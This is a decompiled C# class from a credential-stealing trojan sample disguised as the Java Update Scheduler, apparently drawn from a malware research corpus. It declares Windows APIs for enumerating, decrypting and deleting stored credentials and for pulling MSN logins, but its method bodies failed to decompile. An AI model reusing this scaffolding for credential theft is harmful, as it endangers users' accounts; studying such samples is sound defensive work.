// Decompiled with JetBrains decompiler
// Type: jusched._PASSWORD__s
// Assembly: Java(TM) Update Scheduler, Version=7.8.23.8, Culture=neutral, PublicKeyToken=null
// MVID: 54422980-21B4-4F02-866B-2C0284A5709C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.pay-cb14610d9737dfe6f8672c39419bfd112bcb8aefbdfd7b8ffad486b64e852a23.exe

using System;
using System.Collections;
using System.Collections.Generic;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace jusched
{
  internal class _PASSWORD__s : CUtils, IEnumerable<_PASSWORD__>
  {
    private const int ERROR_SUCCESS = 0;
    private const int HKEY_CURRENT_USER = -2147483647;
    private const int READ_CONTROL = 131072;
    private const int STANDARD_RIGHTS_READ = 131072;
    private const int KEY_QUERY_VALUE = 1;
    private const int KEY_ENUMERATE_SUB_KEYS = 8;
    private const int KEY_NOTIFY = 16;
    private const int SYNCHRONIZE = 1048576;
    private const int STANDARD_RIGHTS_WRITE = 131072;
    private const int KEY_SET_VALUE = 2;
    private const int KEY_CREATE_SUB_KEY = 4;
    private const int KEY_READ = 131097;
    private const int KEY_WRITE = 131078;
    private const int CSIDL_PROGRAM_FILES = 38;
    private List<_PASSWORD__> m_MSNPass;
    [SpecialName]
    private byte[] \u0024STATIC\u0024Base64Dec\u0024201E10E\u0024Enc;

    public _PASSWORD__s()
    {
      // ISSUE: unable to decompile the method.
    }

    [DllImport("kernel32.dll", EntryPoint = "lstrlenA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int lstrlen([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

    [DllImport("advapi32.dll", EntryPoint = "CredEnumerateW", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredEnumerate(
      [MarshalAs(UnmanagedType.LPWStr)] string _param0,
      int _param1,
      ref int _param2,
      ref IntPtr _param3);

    [DllImport("advapi32.dll", EntryPoint = "CredEnumerateW", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredEnumerate(
      IntPtr _param0,
      int _param1,
      ref int _param2,
      ref IntPtr _param3);

    [DllImport("advapi32.dll", EntryPoint = "CredDeleteW", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredDelete([MarshalAs(UnmanagedType.LPWStr)] string _param0, int _param1, int _param2);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CredFree(IntPtr _param0);

    [DllImport("crypt32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptUnprotectData(
      ref _PASSWORD__s.DATA_BLOB _param0,
      int _param1,
      ref _PASSWORD__s.DATA_BLOB _param2,
      int _param3,
      int _param4,
      int _param5,
      ref _PASSWORD__s.DATA_BLOB _param6);

    [DllImport("crypt32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CryptUnprotectData(
      ref _PASSWORD__s.DATA_BLOB _param0,
      int _param1,
      int _param2,
      int _param3,
      int _param4,
      int _param5,
      ref _PASSWORD__s.DATA_BLOB _param6);

    [DllImport("advapi32.dll", EntryPoint = "RegOpenKeyExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegOpenKeyEx(
      int _param0,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
      int _param2,
      int _param3,
      ref int _param4);

    [DllImport("advapi32.dll", EntryPoint = "RegQueryValueExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegQueryValueEx(
      int _param0,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
      int _param2,
      ref int _param3,
      [MarshalAs(UnmanagedType.LPWStr)] string _param4,
      ref int _param5);

    [DllImport("advapi32.dll", EntryPoint = "RegQueryValueExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegQueryValueEx(
      int _param0,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1,
      int _param2,
      ref int _param3,
      IntPtr _param4,
      ref int _param5);

    [DllImport("advapi32.dll", EntryPoint = "RegEnumKeyExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegEnumKeyEx(
      int _param0,
      int _param1,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param2,
      ref int _param3,
      int _param4,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param5,
      int _param6,
      ref _PASSWORD__s.FILETIME _param7);

    [DllImport("advapi32.dll", EntryPoint = "RegDeleteValueA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegDeleteValue(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int LocalFree(int _param0);

    [DllImport("advapi32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RegCloseKey(int _param0);

    [DllImport("shell32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SHGetSpecialFolderLocation(int _param0, int _param1, ref int _param2);

    [DllImport("shell32.dll", EntryPoint = "SHGetPathFromIDListA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SHGetPathFromIDList(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int Initialize(ref Guid _param0, int _param1, int _param2);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int EnumIdentitiesWithCachedCredentials([MarshalAs(UnmanagedType.LPWStr)] string _param0, ref int _param1);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int NextIdentity(int _param0, ref IntPtr _param1);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int PassportFreeMemory(IntPtr _param0);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CloseEnumIdentitiesHandle(int _param0);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CreateIdentityHandle([MarshalAs(UnmanagedType.LPWStr)] string _param0, int _param1, ref int _param2);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CreateIdentityHandle(IntPtr _param0, int _param1, ref int _param2);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int HasPersistedCredential(int _param0, [MarshalAs(UnmanagedType.LPWStr)] string _param1, ref int _param2);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int RemovePersistedCredential(int _param0, [MarshalAs(UnmanagedType.LPWStr)] string _param1);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int GetIdentityPropertyByName(
      int _param0,
      [MarshalAs(UnmanagedType.LPWStr)] string _param1,
      ref int _param2);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int BuildAuthTokenRequest(
      int _param0,
      [MarshalAs(UnmanagedType.LPWStr)] string _param1,
      int _param2,
      ref IntPtr _param3);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int CloseIdentityHandle(int _param0);

    [DllImport("msidcrl.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int Uninitialize();

    [DllImport("kernel32.dll", EntryPoint = "LoadLibraryA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int LoadLibrary([MarshalAs(UnmanagedType.VBByRefStr)] ref string _param0);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FreeLibrary(int _param0);

    private string getProgramFilesFolderPath()
    {
      // ISSUE: unable to decompile the method.
    }

    [MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
    private void getMSN75Passwords()
    {
      // ISSUE: unable to decompile the method.
    }

    public void Refresh()
    {
      // ISSUE: unable to decompile the method.
    }

    private void DeleteAllCred(string _param1)
    {
      // ISSUE: unable to decompile the method.
    }

    private string Base64Dec(ref string _param1)
    {
      // ISSUE: unable to decompile the method.
    }

    public IEnumerator<_PASSWORD__> GetEnumerator()
    {
      // ISSUE: unable to decompile the method.
    }

    IEnumerator IEnumerable.GetEnumerator1()
    {
      // ISSUE: unable to decompile the method.
    }

    private enum CRED_TYPE
    {
    }

    private struct DATA_BLOB
    {
      public int cbData;
      public int pbData;
    }

    private struct FILETIME
    {
      public int dwLowDateTime;
      public int dwHighDateTime;
    }

    private struct CREDENTIAL_ATTRIBUTE
    {
      public int lpstrKeyword;
      public int dwFlags;
      public int dwValueSize;
      public int lpbValue;
    }

    private struct CREDENTIAL
    {
      public int dwFlags;
      public int dwType;
      public int lpstrTargetName;
      public int lpstrComment;
      public _PASSWORD__s.FILETIME ftLastWritten;
      public int dwCredentialBlobSize;
      public int lpbCredentialBlob;
      public int dwPersist;
      public int dwAttributeCount;
      public int lpAttributes;
      public int lpstrTargetAlias;
      public int lpUserName;
    }

    private struct MSNPass
    {
      public string strLogin;
      public string strPass;
      public string strTargetName;
    }
  }
}
